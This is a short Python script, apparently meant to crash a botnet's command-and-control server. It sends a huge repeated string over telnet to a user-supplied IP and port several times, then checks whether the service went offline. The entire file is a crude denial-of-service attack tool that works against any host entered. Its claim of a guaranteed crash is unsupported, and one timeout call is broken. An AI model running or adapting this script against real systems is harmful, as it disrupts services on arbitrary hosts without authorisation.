import telnetlib
import socket

host = str(input("Enter CNC IP: "))
port = int(input("Enter CNC Port: "))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout
timeout = 50

crashstring = "noob"*9999 # WAYY OVER THE LIMIT, GUARNTEED TO CRASH
try:
    with telnetlib.Telnet(host, port, timeout) as session:
        print("Sent string 1")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 2")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 3")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 4")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 5")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 6")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Sent string 7")
        session.write("{}".format(crashstring).encode('ascii'))
except Exception:
    try:
        result = sock.connect_ex((host,port))
        if result == 0:
            print("The botnet is online, the crash failed!")
        else:
            print("The botnet is offline! The crash has succeeded!")
    except:
        print("The botnet is offline! The crash has succeeded!")

